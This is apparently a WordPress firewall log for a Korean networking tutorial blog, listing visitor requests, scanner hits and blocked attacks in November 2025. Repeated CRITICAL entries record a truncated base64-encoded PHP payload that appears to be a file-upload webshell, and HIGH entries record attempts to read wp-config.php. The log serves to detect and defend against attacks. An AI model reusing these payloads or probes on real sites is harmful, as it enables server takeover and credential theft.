+02/Nov/25 12:43:41  #4941243  INFO         -  188.143.244.140  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/] - coffeecrawlers.com 
+
+03/Nov/25 20:08:33  #7782168  MEDIUM     531  35.204.134.146   GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Scrapy/2.13.3 (+https://scrapy.org)] - www.coffeecrawlers.com 
+
+04/Nov/25 02:16:27  #8715040  MEDIUM     531  54.154.237.7     GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)] - www.coffeecrawlers.com 
+
+05/Nov/25 03:28:47  #6568257  INFO         -  172.255.94.172   GET /index.php - Sanitising user input - [HTTP_USER_AGENT: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"] - www.coffeecrawlers.com 
+
+05/Nov/25 03:28:48  #8962341  INFO         -  172.255.94.172   GET /index.php - Sanitising user input - [HTTP_USER_AGENT: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"] - coffeecrawlers.com 
+
+05/Nov/25 04:11:31  #8892149  INFO         -  149.34.252.59    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/#comment-2] - coffeecrawlers.com 
+
+05/Nov/25 04:11:34  #5572510  INFO         -  149.34.252.59    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 
+
+05/Nov/25 04:11:37  #1605124  INFO         -  149.34.252.59    POST /wp-comments-post.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 
+
+05/Nov/25 04:11:39  #5866436  INFO         -  149.34.252.59    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/#comment-11] - coffeecrawlers.com 
+
+05/Nov/25 10:40:13  #1634093  INFO         -  61.83.227.119    POST /wp-login.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/wp-login.php?redirect_to=https%3A%2F%2Fcoffeecrawlers.com%2Fwp-admin%2F&reauth=1] - coffeecrawlers.com 
+
+05/Nov/25 13:44:38  #7047629  CRITICAL     -  196.251.86.170   POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+09/Nov/25 03:36:21  #4476865  CRITICAL     -  74.176.187.23    POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+09/Nov/25 03:36:22  #3517835  CRITICAL     -  74.176.187.23    POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+10/Nov/25 22:19:37  #7724740  INFO         -  172.236.235.77   POST /wp-comments-post.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-4-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 
+
+10/Nov/25 22:19:38  #7515767  INFO         -  172.236.235.77   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-4-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 
+
+11/Nov/25 11:19:22  #4691806  CRITICAL     -  48.210.57.6      POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+11/Nov/25 11:19:25  #6064343  CRITICAL     -  48.210.57.6      POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+12/Nov/25 19:00:09  #1588441  INFO         -  178.157.64.77    GET /index.php - Sanitising user input - [HTTP_USER_AGENT: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0"] - www.coffeecrawlers.com 
+
+12/Nov/25 19:00:12  #3456981  INFO         -  178.157.64.77    GET /index.php - Sanitising user input - [HTTP_USER_AGENT: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0"] - coffeecrawlers.com 
+
+15/Nov/25 01:04:14  #8062252  MEDIUM     531  18.201.104.103   GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)] - coffeecrawlers.com 
+
+15/Nov/25 01:08:23  #7852832  MEDIUM     531  34.244.30.94     GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)] - www.coffeecrawlers.com 
+
+15/Nov/25 22:03:01  #2990719  INFO         -  2.72.34.253      GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/#comment-2] - coffeecrawlers.com 
+
+15/Nov/25 22:03:03  #6218253  INFO         -  2.72.34.253      GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 
+
+15/Nov/25 22:03:05  #2796504  INFO         -  2.72.34.253      POST /wp-comments-post.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 
+
+15/Nov/25 22:03:07  #8395192  INFO         -  2.72.34.253      GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/#comment-73] - coffeecrawlers.com 
+
+17/Nov/25 05:00:33  #2768026  HIGH       310  195.178.110.201  GET /wp-config.php - Access to a configuration file - [SERVER:SCRIPT_NAME = /wp-config.php] - www.coffeecrawlers.com 
+
+18/Nov/25 10:48:35  #1246068  HIGH       310  195.178.110.201  GET /wp-config.php - Access to a configuration file - [SERVER:SCRIPT_NAME = /wp-config.php] - coffeecrawlers.com 
+
+18/Nov/25 23:51:08  #3412948  INFO         -  61.108.4.18      GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/wp-login.php?redirect_to=https%3A%2F%2Fcoffeecrawlers.com%2Fwp-admin%2F&reauth=1] - coffeecrawlers.com 
+
+18/Nov/25 23:51:11  #5942674  INFO         -  61.108.4.18      POST /wp-login.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/wp-login.php?redirect_to=https%3A%2F%2Fcoffeecrawlers.com%2Fwp-admin%2F&reauth=1] - coffeecrawlers.com 
+
+19/Nov/25 22:50:57  #4955775  CRITICAL     -  20.250.44.10     POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+19/Nov/25 22:50:59  #7166073  CRITICAL     -  20.250.44.10     POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+20/Nov/25 22:05:32  #4193533  INFO         -  149.88.19.12     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/#comment-2] - coffeecrawlers.com 
+
+20/Nov/25 22:05:35  #1714268  INFO         -  149.88.19.12     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 
+
+20/Nov/25 22:05:37  #1469009  INFO         -  149.88.19.12     POST /wp-comments-post.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 
+
+20/Nov/25 22:05:39  #5020739  INFO         -  149.88.19.12     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/#comment-99] - coffeecrawlers.com 
+
+20/Nov/25 23:53:04  #5972845  MEDIUM     306  164.90.143.116   GET /index.php - Bogus user-agent signature - [SERVER:HTTP_USER_AGENT = Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)] - coffeecrawlers.com 
+
+21/Nov/25 19:31:16  #2871501  MEDIUM     531  34.90.191.83     GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Scrapy/2.13.3 (+https://scrapy.org)] - coffeecrawlers.com 
+
+22/Nov/25 00:47:26  #1652884  CRITICAL     -  20.37.101.92     POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+22/Nov/25 00:47:27  #4501599  CRITICAL     -  20.37.101.92     POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+22/Nov/25 00:47:59  #7907478  INFO         -  188.143.244.131  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/1-5-lan-%ec%b9%b4%eb%93%9c%ec%99%80-lan-%ec%bc%80%ec%9d%b4%eb%b8%94/#respond] - coffeecrawlers.com 
+
+22/Nov/25 00:48:03  #5364515  INFO         -  188.143.244.131  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/#respond] - coffeecrawlers.com 
+
+22/Nov/25 00:48:07  #4189981  INFO         -  188.143.244.131  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+22/Nov/25 00:48:11  #3046460  INFO         -  188.143.244.131  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/#respond] - coffeecrawlers.com 
+
+22/Nov/25 00:48:19  #1459822  INFO         -  188.143.244.131  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/#respond] - coffeecrawlers.com 
+
+22/Nov/25 00:48:27  #4125470  INFO         -  188.143.244.131  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 
+
+22/Nov/25 00:48:36  #8359021  INFO         -  188.143.244.131  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-1-%ec%9d%b4%eb%8d%94%eb%84%b7ethernet%ec%9d%98-%ec%a0%95%ec%9d%98/#respond] - coffeecrawlers.com 
+
+22/Nov/25 00:48:43  #2349840  INFO         -  188.143.244.131  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/1-5-lan-%ec%b9%b4%eb%93%9c%ec%99%80-lan-%ec%bc%80%ec%9d%b4%eb%b8%94/] - coffeecrawlers.com 
+
+22/Nov/25 00:48:56  #7173772  INFO         -  188.143.244.131  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-1-%ec%9d%b4%eb%8d%94%eb%84%b7ethernet%ec%9d%98-%ec%a0%95%ec%9d%98/] - coffeecrawlers.com 
+
+22/Nov/25 00:49:01  #5993261  INFO         -  188.143.244.131  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/] - coffeecrawlers.com 
+
+22/Nov/25 20:01:43  #2579294  CRITICAL     -  94.177.163.154   POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+22/Nov/25 20:01:46  #6359651  CRITICAL     -  94.177.163.154   POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+22/Nov/25 20:51:43  #1011657  MEDIUM     531  149.50.97.229    HEAD /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Mozilla/5.0 (compatible; WARC-Grabber-LiveCheck/1.0)] - coffeecrawlers.com 
+
+23/Nov/25 01:30:54  #6184978  MEDIUM     531  149.50.97.229    HEAD /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Mozilla/5.0 (compatible; WARC-Grabber-LiveCheck/1.0)] - coffeecrawlers.com 
+
+23/Nov/25 10:12:48  #4486149  INFO         -  51.38.225.46     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-2-lan-%ec%b9%b4%eb%93%9c%ec%99%80-lan-%ec%bc%80%ec%9d%b4%eb%b8%94] - coffeecrawlers.com 
+
+23/Nov/25 10:12:49  #2852919  INFO         -  51.38.225.46     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-2-lan-%ec%b9%b4%eb%93%9c%ec%99%80-lan-%ec%bc%80%ec%9d%b4%eb%b8%94] - coffeecrawlers.com 
+
+23/Nov/25 10:12:58  #7544229  INFO         -  45.138.16.76     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-3-%eb%a7%9d-%ea%b5%ac%ec%a1%b0%ec%99%80-%ed%97%88%eb%b8%8c-%eb%b0%8f-%ec%8a%a4%ec%9c%84%ec%b9%98] - coffeecrawlers.com 
+
+23/Nov/25 10:12:59  #5690641  INFO         -  45.138.16.76     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-3-%eb%a7%9d-%ea%b5%ac%ec%a1%b0%ec%99%80-%ed%97%88%eb%b8%8c-%eb%b0%8f-%ec%8a%a4%ec%9c%84%ec%b9%98] - coffeecrawlers.com 
+
+23/Nov/25 10:13:07  #6588011  INFO         -  45.138.16.76     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-4-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95] - coffeecrawlers.com 
+
+23/Nov/25 10:13:09  #6114104  INFO         -  45.138.16.76     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-4-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95] - coffeecrawlers.com 
+
+23/Nov/25 10:13:27  #2481790  INFO         -  173.255.198.243  GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5] - coffeecrawlers.com 
+
+23/Nov/25 10:13:28  #7178683  INFO         -  173.255.198.243  GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5] - coffeecrawlers.com 
+
+23/Nov/25 10:13:50  #7093936  INFO         -  45.84.107.76     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-1-%ec%9d%b8%ed%84%b0%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%82%b9-%eb%b0%8f-%ec%9d%b8%ed%84%b0%eb%84%b7] - coffeecrawlers.com 
+
+23/Nov/25 10:13:51  #8016710  INFO         -  45.84.107.76     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-1-%ec%9d%b8%ed%84%b0%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%82%b9-%eb%b0%8f-%ec%9d%b8%ed%84%b0%eb%84%b7] - coffeecrawlers.com 
+
+23/Nov/25 10:13:59  #6287670  INFO         -  45.84.107.76     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-2-%eb%9d%bc%ec%9a%b0%ed%84%b0] - coffeecrawlers.com 
+
+23/Nov/25 10:14:00  #6625164  INFO         -  45.84.107.76     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-2-%eb%9d%bc%ec%9a%b0%ed%84%b0] - coffeecrawlers.com 
+
+23/Nov/25 10:14:10  #3257562  INFO         -  185.220.101.46   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-3-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ea%b8%b0%ec%88%a0%ec%9d%98-%eb%b0%9c%ec%a0%84] - coffeecrawlers.com 
+
+23/Nov/25 10:14:10  #8726254  INFO         -  185.220.101.46   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-3-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ea%b8%b0%ec%88%a0%ec%9d%98-%eb%b0%9c%ec%a0%84] - coffeecrawlers.com 
+
+23/Nov/25 10:14:20  #1251177  INFO         -  35.0.127.52      GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-1-wan%ec%9d%98-%eb%ac%bc%eb%a6%ac%ec%a0%81-%ec%97%b0%ea%b2%b0-%eb%b0%8f-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ea%b8%b0%eb%b3%b8-%ec%84%a4%ec%a0%95] - coffeecrawlers.com 
+
+23/Nov/25 10:14:21  #2149481  INFO         -  35.0.127.52      GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-1-wan%ec%9d%98-%eb%ac%bc%eb%a6%ac%ec%a0%81-%ec%97%b0%ea%b2%b0-%eb%b0%8f-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ea%b8%b0%eb%b3%b8-%ec%84%a4%ec%a0%95] - coffeecrawlers.com 
+
+23/Nov/25 10:14:31  #1650209  INFO         -  185.220.101.36   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-2-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ec%84%b8%eb%b6%80-%ec%84%a4%ec%a0%95] - coffeecrawlers.com 
+
+23/Nov/25 10:14:32  #4007732  INFO         -  185.220.101.36   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-2-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ec%84%b8%eb%b6%80-%ec%84%a4%ec%a0%95] - coffeecrawlers.com 
+
+23/Nov/25 10:14:40  #4881846  INFO         -  171.25.193.40    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-3-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac-%ec%8b%9c%eb%ae%ac%eb%a0%88%ec%9d%b4%ec%85%98] - coffeecrawlers.com 
+
+23/Nov/25 10:14:41  #1053003  INFO         -  171.25.193.40    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-3-%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%81%ac-%ec%8b%9c%eb%ae%ac%eb%a0%88%ec%9d%b4%ec%85%98] - coffeecrawlers.com 
+
+24/Nov/25 06:49:42  #2672409  INFO         -  115.91.79.220    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-3-%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC-%EC%8B%9C%EB%AE%AC%EB%A0%88%EC%9D%B4%EC%85%98/] - coffeecrawlers.com 
+
+24/Nov/25 13:51:26  #5742415  INFO         -  149.34.252.9     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/#comment-2] - coffeecrawlers.com 
+
+24/Nov/25 13:51:28  #6090558  INFO         -  149.34.252.9     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 
+
+24/Nov/25 13:51:30  #8425547  INFO         -  149.34.252.9     POST /wp-comments-post.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 
+
+24/Nov/25 13:51:32  #1620919  INFO         -  149.34.252.9     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/#comment-138] - coffeecrawlers.com 
+
+24/Nov/25 14:53:55  #4629925  CRITICAL     -  52.191.198.92    POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+24/Nov/25 14:53:56  #7881980  CRITICAL     -  52.191.198.92    POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+24/Nov/25 17:34:05  #6386677  MEDIUM     531  149.50.97.228    HEAD /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Mozilla/5.0 (compatible; WARC-Grabber-LiveCheck/1.0)] - coffeecrawlers.com 
+
+25/Nov/25 04:54:23  #6757066  INFO         -  118.235.93.68    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-3-%EB%A7%9D-%EA%B5%AC%EC%A1%B0%EC%99%80-%ED%97%88%EB%B8%8C-%EB%B0%8F-%EC%8A%A4%EC%9C%84%EC%B9%98/] - coffeecrawlers.com 
+
+25/Nov/25 04:54:24  #3430661  INFO         -  118.235.93.68    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-3-%EB%A7%9D-%EA%B5%AC%EC%A1%B0%EC%99%80-%ED%97%88%EB%B8%8C-%EB%B0%8F-%EC%8A%A4%EC%9C%84%EC%B9%98/] - coffeecrawlers.com 
+
+25/Nov/25 04:54:48  #8437643  INFO         -  118.235.93.68    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-3-%EB%A7%9D-%EA%B5%AC%EC%A1%B0%EC%99%80-%ED%97%88%EB%B8%8C-%EB%B0%8F-%EC%8A%A4%EC%9C%84%EC%B9%98/] - coffeecrawlers.com 
+
+26/Nov/25 21:27:33  #6019314  CRITICAL     -  172.191.37.184   POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
